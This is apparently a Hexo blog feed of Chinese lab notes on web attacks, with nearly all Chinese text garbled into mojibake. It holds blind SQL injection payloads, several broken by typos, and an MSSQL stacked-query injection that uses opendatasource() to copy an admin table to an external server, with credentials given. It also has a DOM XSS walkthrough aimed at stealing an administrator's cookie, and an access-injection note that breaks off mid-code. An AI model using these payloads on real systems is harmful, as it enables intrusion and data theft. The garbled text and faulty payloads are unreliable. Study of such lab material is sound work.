id="çŒœè§£æ•°æ®åº“åç§°é•¿åº¦ï¼š"><a href="#çŒœè§£æ•°æ®åº“åç§°é•¿åº¦ï¼š" class="headerlink" title="çŒœè§£æ•°æ®åº“åç§°é•¿åº¦ï¼š"></a>çŒœè§£æ•°æ®åº“åç§°é•¿åº¦ï¼š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;and(length(database()))&gt;9 %23</span><br></pre></td></tr></table></figure><pre><code>tips:åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼Œè¿™é‡Œç”±äºæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥ä½¿ç”¨é¡µé¢å›æ˜¾å·®å¼‚æ¥åˆ¤æ–­ä¿¡æ¯ã€‚</code></pre><p>åç»­åªè¦é€šè¿‡æ¯”è¾ƒå¤§å°æ¯”è¾ƒï¼Œæ¥è¿›è¡Œåˆ¤æ–­å³å¯ä»¥çŒœè§£å‡ºæ•°æ®åº“çš„é•¿åº¦</p><h4 id="åˆ©ç”¨asciiç çŒœè§£å½“å‰æ•°æ®åº“åç§°ç¬¬ä¸€ä½ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬ä¸€ä½æ˜¯s"><a href="#åˆ©ç”¨asciiç çŒœè§£å½“å‰æ•°æ®åº“åç§°ç¬¬ä¸€ä½ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬ä¸€ä½æ˜¯s" class="headerlink" title="åˆ©ç”¨asciiç çŒœè§£å½“å‰æ•°æ®åº“åç§°ç¬¬ä¸€ä½ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬ä¸€ä½æ˜¯s"></a>åˆ©ç”¨asciiç çŒœè§£å½“å‰æ•°æ®åº“åç§°ç¬¬ä¸€ä½ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬ä¸€ä½æ˜¯s</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure><h4 id="è¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½æ˜¯eï¼ˆé€šè¿‡ç§»åŠ¨ç¬¬äºŒä½æ•°æ¥ä¸€ä½ä¸€ä½çš„çŒœå‡ºâ€¦â€¦ï¼‰"><a href="#è¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½æ˜¯eï¼ˆé€šè¿‡ç§»åŠ¨ç¬¬äºŒä½æ•°æ¥ä¸€ä½ä¸€ä½çš„çŒœå‡ºâ€¦â€¦ï¼‰" class="headerlink" title="è¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½æ˜¯eï¼ˆé€šè¿‡ç§»åŠ¨ç¬¬äºŒä½æ•°æ¥ä¸€ä½ä¸€ä½çš„çŒœå‡ºâ€¦â€¦ï¼‰"></a>è¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½æ˜¯eï¼ˆé€šè¿‡ç§»åŠ¨ç¬¬äºŒä½æ•°æ¥ä¸€ä½ä¸€ä½çš„çŒœå‡ºâ€¦â€¦ï¼‰</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),2,1)))=101--+</span><br></pre></td></tr></table></figure><h4 id="çŒœè¡¨åï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä½æ˜¯u"><a href="#çŒœè¡¨åï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä½æ˜¯u" class="headerlink" title="çŒœè¡¨åï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä½æ˜¯u"></a>çŒœè¡¨åï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä½æ˜¯u</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and(adcii(substr((select table name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=117</span><br><span class="line">--+</span><br></pre></td></tr></table></figure><h4 id="çŒœå­—æ®µåï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜è¡¨ä¸­çš„åˆ—åç§°ç¬¬ä¸€ä½æ˜¯f"><a href="#çŒœå­—æ®µåï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜è¡¨ä¸­çš„åˆ—åç§°ç¬¬ä¸€ä½æ˜¯f" class="headerlink" title="çŒœå­—æ®µåï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜è¡¨ä¸­çš„åˆ—åç§°ç¬¬ä¸€ä½æ˜¯f"></a>çŒœå­—æ®µåï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜è¡¨ä¸­çš„åˆ—åç§°ç¬¬ä¸€ä½æ˜¯f</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))=102--+</span><br></pre></td></tr></table></figure><h4 id="çŒœå†…å®¹ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜flAgåˆ—ç¬¬ä¸€ä½æ˜¯c"><a href="#çŒœå†…å®¹ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜flAgåˆ—ç¬¬ä¸€ä½æ˜¯c" class="headerlink" title="çŒœå†…å®¹ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜flAgåˆ—ç¬¬ä¸€ä½æ˜¯c"></a>çŒœå†…å®¹ï¼šè¿”å›æ­£å¸¸ï¼Œè¯´æ˜flAgåˆ—ç¬¬ä¸€ä½æ˜¯c</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">andï¼ˆascii(substr((select flAg from users limit 4,1),1,1)))=99--+</span><br></pre></td></tr></table></figure><h4 id="å…·ä½“å°±æ˜¯ä¸€ä½ä¸€ä½çš„çŒœâ€¦â€¦å…¶å®è¿™æ ·æŒºéº»çƒ¦çš„ï¼Œå¯ä»¥é€šè¿‡sqlmapè¿›è¡Œæ³¨å…¥ï¼ŒCTFçš„è¯åˆ™å»ºè®®ç›´æ¥å†™è„šæœ¬ã€‚"><a href="#å…·ä½“å°±æ˜¯ä¸€ä½ä¸€ä½çš„çŒœâ€¦â€¦å…¶å®è¿™æ ·æŒºéº»çƒ¦çš„ï¼Œå¯ä»¥é€šè¿‡sqlmapè¿›è¡Œæ³¨å…¥ï¼ŒCTFçš„è¯åˆ™å»ºè®®ç›´æ¥å†™è„šæœ¬ã€‚" class="headerlink" title="å…·ä½“å°±æ˜¯ä¸€ä½ä¸€ä½çš„çŒœâ€¦â€¦å…¶å®è¿™æ ·æŒºéº»çƒ¦çš„ï¼Œå¯ä»¥é€šè¿‡sqlmapè¿›è¡Œæ³¨å…¥ï¼ŒCTFçš„è¯åˆ™å»ºè®®ç›´æ¥å†™è„šæœ¬ã€‚"></a>å…·ä½“å°±æ˜¯ä¸€ä½ä¸€ä½çš„çŒœâ€¦â€¦å…¶å®è¿™æ ·æŒºéº»çƒ¦çš„ï¼Œå¯ä»¥é€šè¿‡sqlmapè¿›è¡Œæ³¨å…¥ï¼ŒCTFçš„è¯åˆ™å»ºè®®ç›´æ¥å†™è„šæœ¬ã€‚</h4><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>ä¸»è¦é€šè¿‡sleepå‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and if(ascii(substr(databse(),1,1))=115,sleep(5),1)#</span><br></pre></td></tr></table></figure><h4 id="é€šè¿‡ifåˆ¤æ–­æ‰§è¡Œsqlè¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸå°±æ‰§è¡Œsleep-åœ5ç§’å†è¿”å›ï¼Œå¦‚æœä¸ºå‡å°±æ‰§è¡Œ1å³ç«‹å³è¿”å›é¡µé¢"><a href="#é€šè¿‡ifåˆ¤æ–­æ‰§è¡Œsqlè¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸå°±æ‰§è¡Œsleep-åœ5ç§’å†è¿”å›ï¼Œå¦‚æœä¸ºå‡å°±æ‰§è¡Œ1å³ç«‹å³è¿”å›é¡µé¢" class="headerlink" title="é€šè¿‡ifåˆ¤æ–­æ‰§è¡Œsqlè¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸå°±æ‰§è¡Œsleep åœ5ç§’å†è¿”å›ï¼Œå¦‚æœä¸ºå‡å°±æ‰§è¡Œ1å³ç«‹å³è¿”å›é¡µé¢"></a>é€šè¿‡ifåˆ¤æ–­æ‰§è¡Œsqlè¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸå°±æ‰§è¡Œsleep åœ5ç§’å†è¿”å›ï¼Œå¦‚æœä¸ºå‡å°±æ‰§è¡Œ1å³ç«‹å³è¿”å›é¡µé¢</h4><p>æ—¶é—´ç›²æ³¨ æ­¥éª¤å…¶å®åªæ˜¯æ¯”å¸ƒå°”å¤šä¸€æ­¥è€Œå·²ï¼Œåªæ˜¯åŠ å…¥äº†æ—¶é—´å‡½æ•°ä½œä¸ºåˆ¤æ–­ç½¢äº†ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mssqlåå¼¹æ³¨å…¥</title>
      <link href="/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬é€šè¿‡â€™å»æ£€æµ‹ï¼Œå‘ç°å‡ºç°äº†æŠ¥é”™ï¼Œæ˜¾ç¤º<strong>odbc exec()</strong>in C:\Users\Administrator\Desktop\phpstudy\WWW\MSSQL\index.php on line 13,è¯´æ˜ç”¨çš„æ˜¯mssqlæ•°æ®åº“ï¼›</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/L5ya2V*ygEG.5muAFL5ET6AxyulNaRiLwpRO1EFtodA!/b/dLgAAAAAAAAA&amp;bo=QQSjAAAAAAADB8Q!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬é€šè¿‡æµ‹è¯•å»å°è¯•æ³¨å…¥ï¼Œå‘ç°éƒ½å¾ˆéš¾ä»¥è¿›è¡Œæ³¨å…¥ï¼Œåˆæ˜¯mssqlæ•°æ®ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡åå¼¹æ³¨å…¥ï¼›</p><h2 id="åå¼¹æ³¨å…¥ä»‹ç»ï¼š"><a href="#åå¼¹æ³¨å…¥ä»‹ç»ï¼š" class="headerlink" title="åå¼¹æ³¨å…¥ä»‹ç»ï¼š"></a>åå¼¹æ³¨å…¥ä»‹ç»ï¼š</h2><p>åå¼¹æ³¨å…¥å°±æ˜¯åˆ©ç”¨<strong>SQL SERVERçš„opendatasource() å‡½æ•°</strong>ï¼Œæ¥å°†å½“å‰æ•°æ®åº“æŸ¥è¯¢ç»“æœå‘é€åˆ°å¦ä¸€ä¸ªå¤–ç½‘æœåŠ¡å™¨çš„SQL SERVERæ•°æ®åº“ä¸­ï¼Œç„¶åæˆ‘ä»¬åœ¨é€šè¿‡å¤–ç½‘æœåŠ¡å™¨çš„ï¼ˆè‡ªå·±æ­å»ºï¼‰æ•°æ®åº“å»æŸ¥çœ‹æˆ‘ä»¬æŸ¥è¯¢çš„ç»“æœ</p><h2 id="æ³¨å…¥æ­¥éª¤ï¼š"><a href="#æ³¨å…¥æ­¥éª¤ï¼š" class="headerlink" title="æ³¨å…¥æ­¥éª¤ï¼š"></a>æ³¨å…¥æ­¥éª¤ï¼š</h2><ul><li>é¦–å…ˆæˆ‘ä»¬è¦åœ¨æ¥æ”¶æŸ¥è¯¢ç»“æœçš„æœåŠ¡å™¨ä¸Šï¼Œå»æ­å»ºå¥½SQL SERVERæ•°æ®åº“çš„ç¯å¢ƒï¼Œç„¶åå»ºç«‹ä¸€ä¸ªå…·æœ‰ç®¡ç†æƒé™çš„æ•°æ®åº“è´¦æˆ·</li></ul><p>ï¼ˆåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<a href="http://www.webweb.com/" target="_blank" rel="noopener">é¦™æ¸¯äº‘</a>å»åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ•°æ®åº“å¹¶åœ¨é‡Œé¢åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼‰</p><p>ï¼ˆæ³¨æ„ï¼šè¦è®°ä½åˆ›å»ºæ•°æ®åº“åœ°å€ï¼Œæ•°æ®åº“åï¼Œç”¨æˆ·åï¼Œç™»å½•å¯†ç ï¼Œåœ¨åé¢æˆ‘ä»¬è¦é€šè¿‡ä»–ä»¬æ¥ä¼ é€è‡ªå·±æŸ¥è¯¢çš„æ•°æ®åˆ°æœåŠ¡å™¨çš„æ•°æ®åº“ä¸Šï¼‰</p><ul><li><strong>åœ¨DB_14A8E33_4veqjdc8å»ºç«‹t1è¡¨ï¼›</strong><br> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YXHhYQhTY3Zh2Xx3KguZ4REiacY0bIEba3L00BE0tso!/b/dDQBAAAAAAAA&amp;bo=EwXNAQAAAAADF.g!&amp;rf=viewer_4" alt></li><li>ç„¶åæˆ‘ä»¬é€šè¿‡è®¿é—®å¸¦æœ‰opendatasource() å‡½æ•°çš„æ’å…¥è¯­å¥å°†æŸ¥è¯¢è¯­å¥çš„ç»“æœå‘é€åˆ°å¦ä¸€ä¸ªæ•°æ®åº“æœåŠ¡å™¨ä¸­:</li></ul><p>åœ¨è¿™ï¼Œmssqlçš„åç§°ä¸ºsqloledbï¼›å†é€šè¿‡è¿æ¥åœ°å€ã€ç«¯å£ã€ç”¨æˆ·åã€å¯†ç ã€æ•°æ®åº“åï¼šserver=è¿æ¥åœ°å€ï¼Œç«¯å£ï¼Œuid=ç”¨æˆ·åï¼Œpwd=å¯†ï¼›database=æ•°æ®åº“åç§°ã€‚è¿æ¥ä¸ŠæœåŠ¡å™¨åé€‰å®šæ•°æ®è¡¨DB_14A8E33_4veqjdc8.dbo.t1æŠŠåé¢è¯­å¥æŸ¥è¯¢ç»“æœæ’å…¥åˆ°è¡¨ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.203.13.75:8150/MSSQL/?id=2&apos;; insert into opendatasource(&apos;sqloledb&apos;,&apos;server=SQL5006.webweb.com,1433;uid=DB_14A8E33_4veqjdc8_admin;pwd=123456789;database=DB_14A8E33_4veqjdc8&apos;).DB_14A8E33_4veqjdc8.dbo.t1 select * from admin --</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯é€šè¿‡ï¼›ç»“æŸï¼Œåœ¨èµ·ä¸€è¡Œsqlè¯­å¥ï¼Œè¿™é‡Œå¯ä»¥æ˜¯è¯´ä½¿ç”¨äº†å †å æ³¨å…¥ï¼›<br>åå¼¹æ³¨å…¥ç”¨ä¸€å¥è¯æ€»ç»“ï¼šå°±æ˜¯è®©æˆ‘ä»¬ç›®æ ‡çš„æ•°æ®åº“å»æŸ¥è¯¢é‚£å¼ è¡¨ï¼Œç„¶åå°†sqlè¯­å¥æŸ¥è¯¢å†…å®¹æ’å…¥åˆ°å…¬ç½‘çš„ä¸€å°æœåŠ¡å™¨çš„æ•°æ®åº“ä¸­å»ã€‚</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/As84F9cHvY.Jrw7e8F5V0q8IfyQrL0Ko7jL2t4Qn4E0!/b/dL4AAAAAAAAA&amp;bo=fQfHAAAAAAADB58!&amp;rf=viewer_4" alt></p><p>å‘ç°æ˜¾ç¤ºæ­£å¸¸ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯å‘é€åˆ°æœåŠ¡å™¨çš„æ•°æ®åº“æˆåŠŸäº†ï¼Œè¯­å¥æˆåŠŸæ‰§è¡Œ</p><ul><li>ç„¶åæˆ‘ä»¬å»é€šè¿‡è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“DB_14A8E33_4veqjdc8çš„t1è¡¨ï¼Œè·å–åˆ°äº†æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„æ•°æ®ï¼š</li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/5iF49ap5Ts4aLiPrYXtsQiYKmUokAEMUQJazAnH7H44!/b/dL4AAAAAAAAA&amp;bo=cgZWAAAAAAADFxA!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/12/07/hello-world/"/>
      <url>/2019/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dosXSS</title>
      <link href="/2019/12/07/domxss/"/>
      <url>/2019/12/07/domxss/</url>
      
        <content type="html"><![CDATA[<p>è¿›å…¥é¶åœºä¸€çœ‹ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨æœ€ç»å…¸çš„å¼¹çª—è¯­å¥å»æµ‹è¯•ï¼šå‘ç°é¡µé¢ä¸Šæ— å¼¹çª—ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YRHxe6f8yYglIbLiTVCPBDVNd2zBNKspS.YO3oO3uVM!/b/dDQBAAAAAAAA&amp;bo=wwaJAwAAAAADB20!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ä»£ç å‘ç°è¯­å¥å˜æˆè¿™æ ·äº†</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Em9retJmjwJZ90Ast9xNFM5nxtQ9chksuXjpJKSKsL4!/b/dMEAAAAAAAAA&amp;bo=PgKtAAAAAAADF6M!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬å°è¯•ç€é—­åˆè¯­å¥è¯•è¯•ï¼Œç«Ÿç„¶å‡ºç°å¼¹æ¡†</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n9truDqd*7gTaa*V1aN0SUsbUPOjHBbpStMHfr9zjPI!/b/dL8AAAAAAAAA&amp;bo=RAU7AgAAAAADF0o!&amp;rf=viewer_4" alt></p><p>é€šè¿‡å‘ç”Ÿäº‹ä»¶ä¹Ÿå‡ºç°äº†å¼¹æ¡†</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/BcJ437.MUOuKvqZ1AifD455v6KT4wfcIC8wVcnVcARE!/b/dL8AAAAAAAAA&amp;bo=mgVZAwAAAAADF*c!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬è¯•ç€åœ¨ä¸‹é¢çš„èŠå¤©æ¡†ä¹Ÿæµ‹è¯•æµ‹è¯•ï¼Œå‡¡æ˜¯çœ‹è§æœ‰æ¡†å°±æ’ã€‚ã€‚</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/xfbHa701ePPTCRPq9C6PIC61AXFoGe.fq.Hri2ovwGo!/b/dDQBAAAAAAAA&amp;bo=iAVgAwAAAAADF9w!&amp;rf=viewer_4" alt></p><p>å‘ç°ä¹Ÿå¼¹çª—äº†ï¼Œä»¥ä¸Šè¿™äº›éƒ½å±äºåå°„å‹XSSï¼›<br>æˆ‘ä»¬åœ¨é¶åœºæç¤ºä¸­çŸ¥é“äº†ç®¡ç†å‘˜ä¼šå»è®¿é—®dom.phpé¡µé¢ï¼Œå¹¶ä¸”å°†æºç é€éœ²ç»™æˆ‘ä»¬çœ‹äº†</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Gr1bzDuvtcou7WGDWdD4uGlAftdW66fORIKrFwhQDJc!/b/dFIBAAAAAAAA&amp;bo=IgRUAgAAAAADF0I!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬é€šè¿‡ç²—ç•¥çš„çœ‹äº†ä¸‹ä»£ç ï¼Œå‘ç°ä»–é€šè¿‡getæ–¹å¼æ¥å—urlçš„å€¼ï¼Œå¹¶è¿›è¡Œè§£ç ï¼Œå¦‚æœurlçš„å€¼ä¸æ­£åˆ™åŒ¹é…çš„è¯ï¼Œå°±ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤å¹¶å°†å…¶æ’å…¥åˆ°iframeå†…è”æ¡†ä¸­ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°log.htmlåé¢</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/WDJLFWUthFop*NhuYXkMMSTK5rGAbaT.oeSn3hiY1yQ!/b/dDQBAAAAAAAA&amp;bo=3QaEAwAAAAADF24!&amp;rf=viewer_4" alt></p><p>é‚£æˆ‘ä»¬çŸ¥é“äº†ï¼Œæ‰€å†™çš„ä»£ç æœ€ç»ˆä¼šä¼ åˆ°log.htmlä¸Šå»ï¼Œè€Œç®¡ç†å‘˜ä¹Ÿä¼šå®šæœŸæŸ¥çœ‹ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡æ„é€ ä»£ç å»ä¼ å…¥åˆ°log.htmlã€‚å¹¶è·å–ç®¡ç†å‘˜cookieã€‚<br>é‚£æˆ‘ä»¬è¯•ç€è®¿é—®dom.php,æˆ‘ä»¬å‘ç°é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œ</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/N7D3*PMyd2ZMwYEMPmitnJrcLadAgf.mXC.pA8Ibn1Y!/b/dL4AAAAAAAAA&amp;bo=EAcbAwAAAAADFz0!&amp;rf=viewer_4" alt></p><p>å¦‚æœæˆ‘ä»¬æŠŠåœ¨èŠå¤©å®¤æ’åˆ°çš„urlä¸Šçš„xssæ‹¿è¿‡æ¥è¯•è¯•èƒ½ä¸èƒ½å†è¿™æ‰§è¡ŒæˆåŠŸ</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/AwHAQYSnD3zaeAOi0PuxXfVhRzpqON7buau7Tw2Xl8Y!/b/dDEBAAAAAAAA&amp;bo=HQaHAAAAAAADF64!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬è¯•ç€ç™»å½•log.htmlï¼Œå‘ç°ç«Ÿç„¶å¼¹çª—äº†!</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XtZjgHLYxPkMOvmH3WScSxW9PboAof3wNvmOy.3ddU!/b/dMAAAAAAAAAA&amp;bo=7QTMAQAAAAADFxY!&amp;rf=viewer_4" alt></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹é€šè¿‡xsså¹³å°ä¸Šçš„payloadå»è·å–ç®¡ç†å‘˜çš„cookieäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>accessæ•°æ®åº“ä¹‹åç§»æ³¨å…¥</title>
      <link href="/2019/12/07/access/"/>
      <url>/2019/12/07/access/</url>
      
        <content type="html"><![CDATA[<h2 id="åç§»æ³¨å…¥ä»‹ç»"><a href="#åç§»æ³¨å…¥ä»‹ç»" class="headerlink" title="åç§»æ³¨å…¥ä»‹ç»"></a>åç§»æ³¨å…¥ä»‹ç»</h2><p>åç§»æ³¨å…¥æ˜¯æŒ‡æˆ‘ä»¬åœ¨çŸ¥é“è¡¨ï¼Œä½†æŸ¥è¯¢ä¸å‡ºæ¥å­—æ®µçš„æƒ…å†µï¼Œå¦‚ç³»ç»Ÿè‡ªå¸¦çš„æ•°æ®åº“æƒé™ä¸å¤Ÿè€Œæ— æ³•é€šè¿‡è”åˆæŸ¥è¯¢è®¿é—®åˆ°ç³»ç»Ÿè‡ªå¸¦åº“æ¥çˆ†å‡ºå­—æ®µï¼Œè€Œå› ä¸ºå­—æ®µè¿‡é•¿ï¼Œsqlmapä¹Ÿéš¾ä»¥çˆ†å‡ºï¼›æˆ–è€…æ˜¯æ•°æ®åº“æ˜¯accessæ•°æ®åº“ï¼Œé»˜è®¤æ²¡æœ‰ç³»ç»Ÿåº“ï¼›è€Œå½“é‡åˆ°ç±»ä¼¼è¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•é€šè¿‡åç§»æ³¨å…¥æ¥æŸ¥è¯¢è¡¨é‡Œçš„æ•°æ®ï¼›</p><h2 id><a href="#" class="headerlink" title="*"></a>*</h2><p><em>æ˜¯é€šé…ç¬¦çš„æ„æ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡</em>æ¥è¡¨ç¤ºsqlè¯­å¥ä¸­å·²çŸ¥è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼Œåœ¨ä¸‹é¢æˆ‘ä»¬å¯ä»¥é€šè¿‡admin.*æ¥è¡¨ç¤ºadminè¡¨çš„æ‰€æœ‰å­—æ®µã€‚</p><h2 id="åç§»æ³¨å…¥æµç¨‹"><a href="#åç§»æ³¨å…¥æµç¨‹" class="headerlink" title="åç§»æ³¨å…¥æµç¨‹"></a>åç§»æ³¨å…¥æµç¨‹</h2><ol><li>åˆ¤æ–­æ³¨å…¥ç‚¹</li><li>order by åˆ¤æ–­å­—æ®µæ•°</li><li>çŸ¥é“è¡¨å</li><li>è”åˆæŸ¥è¯¢</li><li>è·å–è¡¨ä¸­åˆ—æ•°(çŸ¥é“å­˜åœ¨å‡ ä¸ªå­—æ®µä»¥åŠè¾“å‡ºç‚¹åœ¨å“ª)</li><li>å¼€å§‹åç§»æ³¨å…¥</li></ol><h2 id="å…·ä½“åšæ³•è®²è§£"><a href="#å…·ä½“åšæ³•è®²è§£" class="headerlink" title="å…·ä½“åšæ³•è®²è§£"></a>å…·ä½“åšæ³•è®²è§£</h2><p>å¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“çš„æ˜¯adminè¿™å¼ è¡¨ï¼›<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 